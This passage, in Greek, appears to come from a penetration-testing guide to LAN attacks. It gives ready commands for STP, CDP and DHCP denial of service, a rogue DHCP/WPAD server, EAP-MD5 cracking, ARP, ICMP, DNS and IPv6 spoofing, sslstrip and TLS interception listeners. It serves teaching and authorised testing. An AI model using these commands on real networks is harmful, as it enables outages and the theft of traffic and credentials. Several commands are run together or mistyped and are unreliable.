**Αν ο επιτιθέμενος είναι συνδεδεμένος σε 2 διακόπτες, μπορεί να είναι η ρίζα του νέου δέντρου και όλη η κίνηση μεταξύ αυτών των διακοπτών θα περνάει από αυτόν** (θα εκτελεστεί μια επίθεση MITM).
```bash
yersinia stp -attack 6 #This will cause a DoS as the layer 2 packets wont be forwarded. You can use Ettercap to forward those packets "Sniff" --> "Bridged sniffing"
ettercap -T -i eth1 -B eth2 -q #Set a bridge between 2 interfaces to forwardpackages
```
### CDP Attacks

Το CISCO Discovery Protocol (CDP) είναι απαραίτητο για την επικοινωνία μεταξύ συσκευών CISCO, επιτρέποντάς τους να **αναγνωρίζουν η μία την άλλη και να μοιράζονται λεπτομέρειες διαμόρφωσης**.

#### Passive Data Collection <a href="#id-0e0f" id="id-0e0f"></a>

Το CDP είναι ρυθμισμένο να εκπέμπει πληροφορίες μέσω όλων των θυρών, γεγονός που μπορεί να οδηγήσει σε κίνδυνο ασφάλειας. Ένας επιτιθέμενος, κατά την σύνδεση σε μια θύρα switch, θα μπορούσε να αναπτύξει εργαλεία παρακολούθησης δικτύου όπως **Wireshark**, **tcpdump** ή **Yersinia**. Αυτή η ενέργεια μπορεί να αποκαλύψει ευαίσθητα δεδομένα σχετικά με τη συσκευή δικτύου, συμπεριλαμβανομένου του μοντέλου της και της έκδοσης του Cisco IOS που εκτελεί. Ο επιτιθέμενος μπορεί στη συνέχεια να στοχεύσει συγκεκριμένες ευπάθειες στην αναγνωρισμένη έκδοση του Cisco IOS.

#### Inducing CDP Table Flooding <a href="#id-0d6a" id="id-0d6a"></a>

Μια πιο επιθετική προσέγγιση περιλαμβάνει την εκκίνηση μιας επίθεσης Denial of Service (DoS) πλημμυρίζοντας τη μνήμη του switch, προσποιούμενος ότι είναι νόμιμες συσκευές CISCO. Παρακάτω είναι η ακολουθία εντολών για την εκκίνηση μιας τέτοιας επίθεσης χρησιμοποιώντας το Yersinia, ένα εργαλείο δικτύου σχεδιασμένο για δοκιμές:
```bash
sudo yersinia cdp -attack 1 # Initiates a DoS attack by simulating fake CISCO devices
# Alternatively, for a GUI approach:
sudo yersinia -G
```
Κατά τη διάρκεια αυτής της επίθεσης, η CPU του switch και ο πίνακας γειτόνων CDP επιβαρύνονται σοβαρά, οδηγώντας σε αυτό που συχνά αναφέρεται ως **“παράλυση δικτύου”** λόγω της υπερβολικής κατανάλωσης πόρων.

#### CDP Impersonation Attack
```bash
sudo yersinia cdp -attack 2 #Simulate a new CISCO device
sudo yersinia cdp -attack 0 #Send a CDP packet
```
Μπορείτε επίσης να χρησιμοποιήσετε [**scapy**](https://github.com/secdev/scapy/). Βεβαιωθείτε ότι το έχετε εγκαταστήσει με το πακέτο `scapy/contrib`.

### Επιθέσεις VoIP και το εργαλείο VoIP Hopper

Τα τηλέφωνα VoIP, που ολοένα και περισσότερο ενσωματώνονται με συσκευές IoT, προσφέρουν λειτουργίες όπως το άνοιγμα θυρών ή ο έλεγχος θερμοστατών μέσω ειδικών αριθμών τηλεφώνου. Ωστόσο, αυτή η ενσωμάτωση μπορεί να θέσει κινδύνους ασφαλείας.

Το εργαλείο [**voiphopper**](http://voiphopper.sourceforge.net) έχει σχεδιαστεί για να προσομοιώνει ένα τηλέφωνο VoIP σε διάφορα περιβάλλοντα (Cisco, Avaya, Nortel, Alcatel-Lucent). Ανακαλύπτει το VLAN ID του φωνητικού δικτύου χρησιμοποιώντας πρωτόκολλα όπως CDP, DHCP, LLDP-MED και 802.1Q ARP.

**VoIP Hopper** προσφέρει τρεις λειτουργίες για το Πρωτόκολλο Ανακάλυψης Cisco (CDP):

1. **Sniff Mode** (`-c 0`): Αναλύει τα πακέτα δικτύου για να προσδιορίσει το VLAN ID.
2. **Spoof Mode** (`-c 1`): Δημιουργεί προσαρμοσμένα πακέτα που μιμούνται αυτά μιας πραγματικής συσκευής VoIP.
3. **Spoof with Pre-made Packet Mode** (`-c 2`): Στέλνει πακέτα ταυτόσημα με αυτά ενός συγκεκριμένου μοντέλου τηλεφώνου Cisco IP.

Η προτιμώμενη λειτουργία για ταχύτητα είναι η τρίτη. Απαιτεί τον καθορισμό:

- Της διεπαφής δικτύου του επιτιθέμενου (`-i` παράμετρος).
- Του ονόματος της συσκευής VoIP που προσομοιώνεται (`-E` παράμετρος), σύμφωνα με τη μορφή ονοματοδοσίας της Cisco (π.χ., SEP ακολουθούμενο από μια διεύθυνση MAC).

Σε εταιρικά περιβάλλοντα, για να μιμηθεί μια υπάρχουσα συσκευή VoIP, μπορεί κανείς να:

- Εξετάσει την ετικέτα MAC στο τηλέφωνο.
- Περιηγηθεί στις ρυθμίσεις οθόνης του τηλεφώνου για να δει πληροφορίες μοντέλου.
- Συνδέσει τη συσκευή VoIP σε ένα φορητό υπολογιστή και να παρακολουθήσει τα αιτήματα CDP χρησιμοποιώντας το Wireshark.

Ένα παράδειγμα εντολής για να εκτελέσετε το εργαλείο στην τρίτη λειτουργία θα ήταν:
```bash
voiphopper -i eth1 -E 'SEP001EEEEEEEEE ' -c 2
```
### DHCP Attacks

#### Enumeration
```bash
nmap --script broadcast-dhcp-discover
Starting Nmap 7.80 ( https://nmap.org ) at 2019-10-16 05:30 EDT
WARNING: No targets were specified, so 0 hosts scanned.
Pre-scan script results:
| broadcast-dhcp-discover:
|   Response 1 of 1:
|     IP Offered: 192.168.1.250
|     DHCP Message Type: DHCPOFFER
|     Server Identifier: 192.168.1.1
|     IP Address Lease Time: 1m00s
|     Subnet Mask: 255.255.255.0
|     Router: 192.168.1.1
|     Domain Name Server: 192.168.1.1
|_    Domain Name: mynet
Nmap done: 0 IP addresses (0 hosts up) scanned in 5.27 seconds
```
**DoS**

**Δύο τύποι DoS** μπορούν να εκτελούνται κατά των DHCP servers. Ο πρώτος περιλαμβάνει **την προσομοίωση αρκετών ψεύτικων hosts για να χρησιμοποιηθούν όλες οι δυνατές διευθύνσεις IP**.\
Αυτή η επίθεση θα λειτουργήσει μόνο αν μπορείτε να δείτε τις απαντήσεις του DHCP server και να ολοκληρώσετε το πρωτόκολλο (**Discover** (Comp) --> **Offer** (server) --> **Request** (Comp) --> **ACK** (server)). Για παράδειγμα, αυτό **δεν είναι δυνατό σε δίκτυα Wifi**.

Μια άλλη μέθοδος για να εκτελέσετε μια DHCP DoS είναι να στείλετε ένα **DHCP-RELEASE πακέτο χρησιμοποιώντας ως πηγή κάθε δυνατή IP**. Τότε, ο server θα νομίζει ότι όλοι έχουν τελειώσει τη χρήση της IP.
```bash
yersinia dhcp -attack 1
yersinia dhcp -attack 3 #More parameters are needed
```
Μια πιο αυτόματη μέθοδος για να το κάνετε αυτό είναι η χρήση του εργαλείου [DHCPing](https://github.com/kamorin/DHCPig)

Μπορείτε να χρησιμοποιήσετε τις αναφερόμενες επιθέσεις DoS για να αναγκάσετε τους πελάτες να αποκτήσουν νέες μισθώσεις εντός του περιβάλλοντος και να εξαντλήσετε τους νόμιμους διακομιστές ώστε να γίνουν μη ανταγωνιστικοί. Έτσι, όταν οι νόμιμοι προσπαθήσουν να επανασυνδεθούν, **μπορείτε να σερβίρετε κακόβουλες τιμές που αναφέρονται στην επόμενη επίθεση**.

#### Ορισμός κακόβουλων τιμών

Ένας κακόβουλος διακομιστής DHCP μπορεί να ρυθμιστεί χρησιμοποιώντας το σενάριο DHCP που βρίσκεται στο `/usr/share/responder/DHCP.py`. Αυτό είναι χρήσιμο για επιθέσεις δικτύου, όπως η καταγραφή της κίνησης HTTP και των διαπιστευτηρίων, ανακατευθύνοντας την κίνηση σε έναν κακόβουλο διακομιστή. Ωστόσο, η ρύθμιση ενός κακόβουλου πύλης είναι λιγότερο αποτελεσματική, καθώς επιτρέπει μόνο την καταγραφή της εξερχόμενης κίνησης από τον πελάτη, χάνοντας τις απαντήσεις από την πραγματική πύλη. Αντίθετα, συνιστάται η ρύθμιση ενός κακόβουλου διακομιστή DNS ή WPAD για μια πιο αποτελεσματική επίθεση.

Παρακάτω είναι οι επιλογές εντολών για τη ρύθμιση του κακόβουλου διακομιστή DHCP:

- **Διεύθυνση IP μας (Διαφήμιση Πύλης)**: Χρησιμοποιήστε `-i 10.0.0.100` για να διαφημίσετε τη διεύθυνση IP της μηχανής σας ως πύλη.
- **Τοπικό Όνομα Τομέα DNS**: Προαιρετικά, χρησιμοποιήστε `-d example.org` για να ορίσετε ένα τοπικό όνομα τομέα DNS.
- **Αρχική Διεύθυνση IP Ρουτερ/Πύλης**: Χρησιμοποιήστε `-r 10.0.0.1` για να προσδιορίσετε τη διεύθυνση IP του νόμιμου ρουτερ ή πύλης.
- **Διεύθυνση IP Κύριου Διακομιστή DNS**: Χρησιμοποιήστε `-p 10.0.0.100` για να ορίσετε τη διεύθυνση IP του κακόβουλου διακομιστή DNS που ελέγχετε.
- **Διεύθυνση IP Δευτερεύοντος Διακομιστή DNS**: Προαιρετικά, χρησιμοποιήστε `-s 10.0.0.1` για να ορίσετε μια δευτερεύουσα διεύθυνση IP διακομιστή DNS.
- **Μάσκα Δικτύου Τοπικού Δικτύου**: Χρησιμοποιήστε `-n 255.255.255.0` για να ορίσετε τη μάσκα για το τοπικό δίκτυο.
- **Διεπαφή για Κίνηση DHCP**: Χρησιμοποιήστε `-I eth1` για να ακούσετε την κίνηση DHCP σε μια συγκεκριμένη διεπαφή δικτύου.
- **Διεύθυνση Ρύθμισης WPAD**: Χρησιμοποιήστε `-w “http://10.0.0.100/wpad.dat”` για να ορίσετε τη διεύθυνση για τη ρύθμιση WPAD, βοηθώντας στην παρεμπόδιση της κίνησης ιστού.
- **Ψεύτικη Διεύθυνση IP Προεπιλεγμένης Πύλης**: Συμπεριλάβετε `-S` για να ψεύδεστε τη διεύθυνση IP της προεπιλεγμένης πύλης.
- **Απάντηση σε Όλες τις Αιτήσεις DHCP**: Συμπεριλάβετε `-R` για να κάνετε τον διακομιστή να απαντά σε όλες τις αιτήσεις DHCP, αλλά να είστε προσεκτικοί καθώς αυτό είναι θορυβώδες και μπορεί να ανιχνευθεί.

Χρησιμοποιώντας σωστά αυτές τις επιλογές, μπορεί να δημιουργηθεί ένας κακόβουλος διακομιστής DHCP για να παρεμποδίσει αποτελεσματικά την κίνηση δικτύου.
```python
# Example to start a rogue DHCP server with specified options
!python /usr/share/responder/DHCP.py -i 10.0.0.100 -d example.org -r 10.0.0.1 -p 10.0.0.100 -s 10.0.0.1 -n 255.255.255.0 -I eth1 -w "http://10.0.0.100/wpad.dat" -S -R
```
### **EAP Επιθέσεις**

Εδώ είναι μερικές από τις τακτικές επιθέσεων που μπορούν να χρησιμοποιηθούν κατά των υλοποιήσεων 802.1X:

- Ενεργή βίαιη προσπάθεια αποκωδικοποίησης κωδικών πρόσβασης μέσω EAP
- Επίθεση στον διακομιστή RADIUS με κακώς διαμορφωμένο περιεχόμενο EAP _\*\*_(exploits)
- Καταγραφή μηνυμάτων EAP και εκ των υστέρων αποκωδικοποίηση κωδικών πρόσβασης (EAP-MD5 και PEAP)
- Ανάγκαστη αυθεντικοποίηση EAP-MD5 για παράκαμψη της επικύρωσης πιστοποιητικού TLS
- Εισαγωγή κακόβουλης δικτυακής κίνησης κατά την αυθεντικοποίηση χρησιμοποιώντας ένα hub ή παρόμοιο

Εάν ο επιτιθέμενος είναι μεταξύ του θύματος και του διακομιστή αυθεντικοποίησης, θα μπορούσε να προσπαθήσει να υποβαθμίσει (αν είναι απαραίτητο) το πρωτόκολλο αυθεντικοποίησης σε EAP-MD5 και να καταγράψει την προσπάθεια αυθεντικοποίησης. Στη συνέχεια, θα μπορούσε να το αποκωδικοποιήσει βίαια χρησιμοποιώντας:
```
eapmd5pass –r pcap.dump –w /usr/share/wordlist/sqlmap.txt
```
### FHRP (GLBP & HSRP) Attacks <a href="#id-6196" id="id-6196"></a>

**FHRP** (Πρωτόκολλο Πρώτης Εναλλακτικής Διαδρομής) είναι μια κατηγορία πρωτοκόλλων δικτύου που έχει σχεδιαστεί για να **δημιουργεί ένα σύστημα δρομολόγησης με ζεστή εναλλακτική διαδρομή**. Με το FHRP, φυσικοί δρομολογητές μπορούν να συνδυαστούν σε μια ενιαία λογική συσκευή, η οποία αυξάνει την αντοχή σε σφάλματα και βοηθά στη διανομή του φορτίου.

**Οι μηχανικοί της Cisco Systems έχουν αναπτύξει δύο πρωτόκολλα FHRP, GLBP και HSRP.**

{{#ref}}
glbp-and-hsrp-attacks.md
{{#endref}}

### RIP

Τρεις εκδόσεις του Πρωτοκόλλου Πληροφοριών Δρομολόγησης (RIP) είναι γνωστό ότι υπάρχουν: RIP, RIPv2 και RIPng. Τα datagrams αποστέλλονται σε ομότιμους μέσω της θύρας 520 χρησιμοποιώντας UDP από το RIP και το RIPv2, ενώ τα datagrams μεταδίδονται στη θύρα UDP 521 μέσω IPv6 multicast από το RIPng. Η υποστήριξη για την αυθεντικοποίηση MD5 εισήχθη από το RIPv2. Από την άλλη πλευρά, η εγγενής αυθεντικοποίηση δεν ενσωματώνεται από το RIPng; αντίθετα, βασίζεται σε προαιρετικά IPsec AH και ESP headers εντός IPv6.

- **RIP και RIPv2:** Η επικοινωνία γίνεται μέσω UDP datagrams στη θύρα 520.
- **RIPng:** Χρησιμοποιεί τη θύρα UDP 521 για τη μετάδοση datagrams μέσω IPv6 multicast.

Σημειώστε ότι το RIPv2 υποστηρίζει την αυθεντικοποίηση MD5 ενώ το RIPng δεν περιλαμβάνει εγγενή αυθεντικοποίηση, βασιζόμενο σε IPsec AH και ESP headers στο IPv6.

### EIGRP Attacks

**EIGRP (Πρωτόκολλο Δρομολόγησης Ενισχυμένης Εσωτερικής Πύλης)** είναι ένα δυναμικό πρωτόκολλο δρομολόγησης. **Είναι ένα πρωτόκολλο απόστασης-διανύσματος.** Εάν δεν υπάρχει **αυθεντικοποίηση** και ρύθμιση παθητικών διεπαφών, ένας **εισβολέας** μπορεί να παρεμβαίνει στη δρομολόγηση EIGRP και να προκαλέσει **δηλητηρίαση πινάκων δρομολόγησης**. Επιπλέον, το δίκτυο EIGRP (με άλλα λόγια, το αυτόνομο σύστημα) **είναι επίπεδο και δεν έχει τμηματοποίηση σε ζώνες**. Εάν ένας **επιτιθέμενος εισάγει μια διαδρομή**, είναι πιθανό αυτή η διαδρομή να **διαδοθεί** σε όλο το αυτόνομο σύστημα EIGRP.

Για να επιτεθεί σε ένα σύστημα EIGRP απαιτείται **η δημιουργία γειτονιάς με έναν νόμιμο δρομολογητή EIGRP**, που ανοίγει πολλές δυνατότητες, από βασική αναγνώριση μέχρι διάφορες ενέσεις.

[**FRRouting**](https://frrouting.org/) σας επιτρέπει να υλοποιήσετε **έναν εικονικό δρομολογητή που υποστηρίζει BGP, OSPF, EIGRP, RIP και άλλα πρωτόκολλα.** Το μόνο που χρειάζεται να κάνετε είναι να το αναπτύξετε στο σύστημα του επιτιθέμενου και μπορείτε πραγματικά να προσποιηθείτε ότι είστε ένας νόμιμος δρομολογητής στον τομέα δρομολόγησης.

{{#ref}}
eigrp-attacks.md
{{#endref}}

[**Coly**](https://code.google.com/p/coly/) έχει δυνατότητες για την παρεμβολή των εκπομπών EIGRP (Πρωτόκολλο Δρομολόγησης Ενισχυμένης Εσωτερικής Πύλης). Επιτρέπει επίσης την έγχυση πακέτων, τα οποία μπορούν να χρησιμοποιηθούν για την τροποποίηση των ρυθμίσεων δρομολόγησης.

### OSPF

Στο πρωτόκολλο Open Shortest Path First (OSPF) **η αυθεντικοποίηση MD5 χρησιμοποιείται συνήθως για να διασφαλίσει ασφαλή επικοινωνία μεταξύ των δρομολογητών**. Ωστόσο, αυτό το μέτρο ασφαλείας μπορεί να παραβιαστεί χρησιμοποιώντας εργαλεία όπως το Loki και το John the Ripper. Αυτά τα εργαλεία είναι ικανά να συλλάβουν και να σπάσουν τα MD5 hashes, εκθέτοντας το κλειδί αυθεντικοποίησης. Μόλις αποκτηθεί αυτό το κλειδί, μπορεί να χρησιμοποιηθεί για την εισαγωγή νέων πληροφοριών δρομολόγησης. Για να ρυθμίσετε τις παραμέτρους διαδρομής και να καθορίσετε το παραβιασμένο κλειδί, χρησιμοποιούνται οι καρτέλες _Injection_ και _Connection_, αντίστοιχα.

- **Σύλληψη και Σπάσιμο MD5 Hashes:** Εργαλεία όπως το Loki και το John the Ripper χρησιμοποιούνται για αυτό το σκοπό.
- **Ρύθμιση Παραμέτρων Διαδρομής:** Αυτό γίνεται μέσω της καρτέλας _Injection_.
- **Ρύθμιση του Παραβιασμένου Κλειδιού:** Το κλειδί ρυθμίζεται στην καρτέλα _Connection_.

### Other Generic Tools & Sources

- [**Above**](https://github.com/c4s73r/Above): Εργαλείο για σάρωση δικτυακής κίνησης και εύρεση ευπαθειών
- Μπορείτε να βρείτε **περισσότερες πληροφορίες σχετικά με επιθέσεις δικτύου** [**εδώ**](https://github.com/Sab0tag3d/MITM-cheatsheet).

## **Spoofing**

Ο επιτιθέμενος ρυθμίζει όλες τις παραμέτρους δικτύου (GW, IP, DNS) του νέου μέλους του δικτύου στέλνοντας ψεύτικες απαντήσεις DHCP.
```bash
Ettercap
yersinia dhcp -attack 2 #More parameters are needed
```
### ARP Spoofing

Δείτε την [προηγούμενη ενότητα](#arp-spoofing).

### ICMPRedirect

Το ICMP Redirect συνίσταται στην αποστολή ενός πακέτου ICMP τύπου 1 κωδικού 5 που υποδεικνύει ότι ο επιτιθέμενος είναι ο καλύτερος τρόπος για να φτάσετε σε μια διεύθυνση IP. Στη συνέχεια, όταν το θύμα θέλει να επικοινωνήσει με την IP, θα στείλει το πακέτο μέσω του επιτιθέμενου.
```bash
Ettercap
icmp_redirect
hping3 [VICTIM IP ADDRESS] -C 5 -K 1 -a [VICTIM DEFAULT GW IP ADDRESS] --icmp-gw [ATTACKER IP ADDRESS] --icmp-ipdst [DST IP ADDRESS] --icmp-ipsrc [VICTIM IP ADDRESS] #Send icmp to [1] form [2], route to [3] packets sent to [4] from [5]
```
### DNS Spoofing

Ο επιτιθέμενος θα επιλύσει μερικούς (ή όλους) τους τομείς που ζητάει το θύμα.
```bash
set dns.spoof.hosts ./dns.spoof.hosts; dns.spoof on
```
**Ρυθμίστε το δικό σας DNS με το dnsmasq**
```bash
apt-get install dnsmasqecho "addn-hosts=dnsmasq.hosts" > dnsmasq.conf #Create dnsmasq.confecho "127.0.0.1   domain.example.com" > dnsmasq.hosts #Domains in dnsmasq.hosts will be the domains resolved by the Dsudo dnsmasq -C dnsmasq.conf --no-daemon
dig @localhost domain.example.com # Test the configured DNS
```
### Τοπικές Πύλες

Πολλές διαδρομές προς συστήματα και δίκτυα συχνά υπάρχουν. Αφού δημιουργήσετε μια λίστα με διευθύνσεις MAC εντός του τοπικού δικτύου, χρησιμοποιήστε το _gateway-finder.py_ για να εντοπίσετε τους κόμβους που υποστηρίζουν την προώθηση IPv4.
```
root@kali:~# git clone https://github.com/pentestmonkey/gateway-finder.git
root@kali:~# cd gateway-finder/
root@kali:~# arp-scan -l | tee hosts.txt
Interface: eth0, datalink type: EN10MB (Ethernet)
Starting arp-scan 1.6 with 256 hosts (http://www.nta-monitor.com/tools/arp-scan/)
10.0.0.100     00:13:72:09:ad:76       Dell Inc.
10.0.0.200     00:90:27:43:c0:57       INTEL CORPORATION
10.0.0.254     00:08:74:c0:40:ce       Dell Computer Corp.

root@kali:~/gateway-finder# ./gateway-finder.py -f hosts.txt -i 209.85.227.99
gateway-finder v1.0 http://pentestmonkey.net/tools/gateway-finder
[+] Using interface eth0 (-I to change)
[+] Found 3 MAC addresses in hosts.txt
[+] We can ping 209.85.227.99 via 00:13:72:09:AD:76 [10.0.0.100]
[+] We can reach TCP port 80 on 209.85.227.99 via 00:13:72:09:AD:76 [10.0.0.100]
```
### [Spoofing LLMNR, NBT-NS, and mDNS](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)

Για την τοπική επίλυση ονομάτων όταν οι αναζητήσεις DNS αποτυγχάνουν, τα συστήματα της Microsoft βασίζονται στην **Link-Local Multicast Name Resolution (LLMNR)** και την **NetBIOS Name Service (NBT-NS)**. Ομοίως, οι υλοποιήσεις **Apple Bonjour** και **Linux zero-configuration** χρησιμοποιούν **Multicast DNS (mDNS)** για την ανακάλυψη συστημάτων εντός ενός δικτύου. Λόγω της μη αυθεντικοποιημένης φύσης αυτών των πρωτοκόλλων και της λειτουργίας τους μέσω UDP, στέλνοντας μηνύματα, μπορούν να εκμεταλλευτούν από επιτιθέμενους που στοχεύουν να ανακατευθύνουν τους χρήστες σε κακόβουλες υπηρεσίες.

Μπορείτε να προσποιηθείτε υπηρεσίες που αναζητούνται από τους hosts χρησιμοποιώντας το Responder για να στείλετε ψευδείς απαντήσεις.\
Διαβάστε εδώ περισσότερες πληροφορίες σχετικά με [το πώς να προσποιηθείτε υπηρεσίες με το Responder](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md).

### [Spoofing WPAD](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)

Οι περιηγητές χρησιμοποιούν συνήθως το **Web Proxy Auto-Discovery (WPAD) πρωτόκολλο για να αποκτούν αυτόματα ρυθμίσεις proxy**. Αυτό περιλαμβάνει την ανάκτηση λεπτομερειών ρύθμισης από έναν διακομιστή, συγκεκριμένα μέσω μιας διεύθυνσης URL όπως "http://wpad.example.org/wpad.dat". Η ανακάλυψη αυτού του διακομιστή από τους πελάτες μπορεί να συμβεί μέσω διαφόρων μηχανισμών:

- Μέσω **DHCP**, όπου η ανακάλυψη διευκολύνεται με τη χρήση μιας ειδικής καταχώρησης κωδικού 252.
- Από **DNS**, που περιλαμβάνει την αναζήτηση ενός ονόματος υπολογιστή με την ετικέτα _wpad_ εντός του τοπικού τομέα.
- Μέσω **Microsoft LLMNR και NBT-NS**, που είναι μηχανισμοί εφεδρείας που χρησιμοποιούνται σε περιπτώσεις όπου οι αναζητήσεις DNS δεν επιτυγχάνουν.

Το εργαλείο Responder εκμεταλλεύεται αυτό το πρωτόκολλο ενεργώντας ως **κακόβουλος διακομιστής WPAD**. Χρησιμοποιεί DHCP, DNS, LLMNR και NBT-NS για να παραπλανήσει τους πελάτες να συνδεθούν σε αυτό. Για να εμβαθύνετε στο πώς μπορούν να προσποιηθούν οι υπηρεσίες χρησιμοποιώντας το Responder [ελέγξτε αυτό](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md).

### [Spoofing SSDP and UPnP devices](spoofing-ssdp-and-upnp-devices.md)

Μπορείτε να προσφέρετε διαφορετικές υπηρεσίες στο δίκτυο για να προσπαθήσετε να **παγιδεύσετε έναν χρήστη** να εισάγει κάποια **κωδικοποιημένα διαπιστευτήρια**. **Περισσότερες πληροφορίες σχετικά με αυτήν την επίθεση στο** [**Spoofing SSDP and UPnP Devices**](spoofing-ssdp-and-upnp-devices.md)**.**

### IPv6 Neighbor Spoofing

Αυτή η επίθεση είναι πολύ παρόμοια με την ARP Spoofing αλλά στον κόσμο του IPv6. Μπορείτε να κάνετε το θύμα να πιστέψει ότι το IPv6 του GW έχει το MAC του επιτιθέμενου.
```bash
sudo parasite6 -l eth0 # This option will respond to every requests spoofing the address that was requested
sudo fake_advertise6 -r -w 2 eth0 <Router_IPv6> #This option will send the Neighbor Advertisement packet every 2 seconds
```
### IPv6 Router Advertisement Spoofing/Flooding

Ορισμένα λειτουργικά συστήματα ρυθμίζουν από προεπιλογή την πύλη από τα πακέτα RA που αποστέλλονται στο δίκτυο. Για να δηλώσετε τον επιτιθέμενο ως IPv6 δρομολογητή μπορείτε να χρησιμοποιήσετε:
```bash
sysctl -w net.ipv6.conf.all.forwarding=1 4
ip route add default via <ROUTER_IPv6> dev wlan0
fake_router6 wlan0 fe80::01/16
```
### IPv6 DHCP spoofing

Από προεπιλογή, ορισμένα λειτουργικά συστήματα προσπαθούν να ρυθμίσουν το DNS διαβάζοντας ένα πακέτο DHCPv6 στο δίκτυο. Στη συνέχεια, ένας επιτιθέμενος θα μπορούσε να στείλει ένα πακέτο DHCPv6 για να ρυθμιστεί ως DNS. Το DHCP παρέχει επίσης μια διεύθυνση IPv6 στο θύμα.
```bash
dhcp6.spoof on
dhcp6.spoof.domains <list of domains>

mitm6
```
### HTTP (ψεύτικη σελίδα και εισαγωγή κώδικα JS)

## Επιθέσεις στο Διαδίκτυο

### sslStrip

Βασικά, αυτό που κάνει αυτή η επίθεση είναι, σε περίπτωση που ο **χρήστης** προσπαθήσει να **πρόσβαση** σε μια **σελίδα HTTP** που **ανακατευθύνει** στην **έκδοση HTTPS**. Το **sslStrip** θα **διατηρήσει** μια **σύνδεση HTTP με** τον **πελάτη και** μια **σύνδεση HTTPS με** τον **διακομιστή** έτσι ώστε να μπορεί να **καταγράψει** τη σύνδεση σε **καθαρό κείμενο**.
```bash
apt-get install sslstrip
sslstrip -w /tmp/sslstrip.log --all - l 10000 -f -k
#iptables --flush
#iptables --flush -t nat
iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000
iptables -A INPUT -p tcp --destination-port 10000 -j ACCEPT
```
Περισσότερες πληροφορίες [εδώ](https://www.blackhat.com/presentations/bh-dc-09/Marlinspike/BlackHat-DC-09-Marlinspike-Defeating-SSL.pdf).

### sslStrip+ και dns2proxy για την παράκαμψη του HSTS

Η **διαφορά** μεταξύ **sslStrip+ και dns2proxy** σε σχέση με **sslStrip** είναι ότι θα **ανακατευθύνουν** για παράδειγμα το _**www.facebook.com**_ **σε** _**wwww.facebook.com**_ (σημειώστε το **επιπλέον** "**w**") και θα ορίσουν τη **διεύθυνση αυτού του τομέα ως τη διεύθυνση IP του επιτιθέμενου**. Με αυτόν τον τρόπο, ο **πελάτης** θα **συνδεθεί** στο _**wwww.facebook.com**_ **(τον επιτιθέμενο)** αλλά πίσω από τις σκηνές το **sslstrip+** θα **διατηρεί** τη **πραγματική σύνδεση** μέσω https με **www.facebook.com**.

Ο **στόχος** αυτής της τεχνικής είναι να **αποφευχθεί το HSTS** επειδή το _**wwww**.facebook.com_ **δεν θα** αποθηκευτεί στην **κρυφή μνήμη** του προγράμματος περιήγησης, οπότε το πρόγραμμα περιήγησης θα παραπλανηθεί να εκτελέσει **την αυθεντικοποίηση του facebook σε HTTP**.\
Σημειώστε ότι για να εκτελεστεί αυτή η επίθεση, το θύμα πρέπει αρχικά να προσπαθήσει να αποκτήσει πρόσβαση στο [http://www.faceook.com](http://www.faceook.com) και όχι στο https. Αυτό μπορεί να γίνει τροποποιώντας τους συνδέσμους μέσα σε μια σελίδα http.

Περισσότερες πληροφορίες [εδώ](https://www.bettercap.org/legacy/#hsts-bypass), [εδώ](https://www.slideshare.net/Fatuo__/offensive-exploiting-dns-servers-changes-blackhat-asia-2014) και [εδώ](https://security.stackexchange.com/questions/91092/how-does-bypassing-hsts-with-sslstrip-work-exactly).

**sslStrip ή sslStrip+ δεν λειτουργεί πια. Αυτό συμβαίνει επειδή υπάρχουν κανόνες HSTS που είναι αποθηκευμένοι στους περιηγητές, οπότε ακόμη και αν είναι η πρώτη φορά που ένας χρήστης αποκτά πρόσβαση σε έναν "σημαντικό" τομέα, θα αποκτήσει πρόσβαση μέσω HTTPS. Επίσης, σημειώστε ότι οι αποθηκευμένοι κανόνες και άλλοι παραγόμενοι κανόνες μπορούν να χρησιμοποιούν τη σημαία** [**`includeSubdomains`**](https://hstspreload.appspot.com) **έτσι το** _**wwww.facebook.com**_ **παράδειγμα από πριν δεν θα λειτουργεί πια καθώς το** _**facebook.com**_ **χρησιμοποιεί HSTS με `includeSubdomains`.**

TODO: easy-creds, evilgrade, metasploit, factory

## TCP listen in port
```bash
sudo nc -l -p 80
socat TCP4-LISTEN:80,fork,reuseaddr -
```
## TCP + SSL listen in port

#### Δημιουργία κλειδιών και αυτο-υπογεγραμμένου πιστοποιητικού
```
FILENAME=server
# Generate a public/private key pair:
openssl genrsa -out $FILENAME.key 1024
# Generate a self signed certificate:
openssl req -new -key $FILENAME.key -x509 -sha256 -days 3653 -out $FILENAME.crt
# Generate the PEM file by just appending the key and certificate files:
cat $FILENAME.key $FILENAME.crt >$FILENAME.pem
```
#### Ακούστε χρησιμοποιώντας πιστοποιητικό
```
sudo socat -v -v openssl-listen:443,reuseaddr,fork,cert=$FILENAME.pem,cafile=$FILENAME.crt,verify=0 -
```
#### Άκουσμα χρησιμοποιώντας πιστοποιητικό και ανακατεύθυνση στους κόμβους
```
sudo socat -v -v openssl-listen:443,reuseaddr,fork,cert=$FILENAME.pem,cafile=$FILENAME.crt,verify=0  openssl-connect:[SERVER]:[PORT],verify=0
```
Κάποιες φορές, αν ο πελάτης ελέγξει ότι η CA είναι έγκυρη, θα μπορούσατε **να σερβίρετε ένα πιστοποιητικό άλλου hostname υπογεγραμμένο από μια CA**.\
Ένας άλλος ενδιαφέρον έλεγχος είναι να σερβίρετε ένα **πιστοποιητικό του ζητούμενου hostname αλλά αυτο-υπογεγραμμένο**.

Άλλα πράγματα που μπορείτε να δοκιμάσετε είναι να προσπαθήσετε να υπογράψετε το πιστοποιητικό με ένα έγκυρο πιστοποιητικό που δεν είναι έγκυρη CA. Ή να χρησιμοποιήσετε το έγκυρο δημόσιο κλειδί, να αναγκάσετε τη χρήση ενός αλγορίθμου όπως το diffie hellman (ένας που δεν χρειάζεται να αποκρυπτογραφήσει τίποτα με το πραγματικό ιδιωτικό κλειδί) και όταν ο πελάτης ζητήσει μια πρόβλεψη του πραγματικού ιδιωτικού κλειδιού (όπως ένα hash) να στείλετε μια ψεύτικη πρόβλεψη και να περιμένετε ότι ο πελάτης δεν θα ελέγξει αυτό.

## Bettercap
```bash
# Events
events.stream off #Stop showing events
events.show #Show all events
events.show 5 #Show latests 5 events
events.clear

# Ticker (loop of commands)
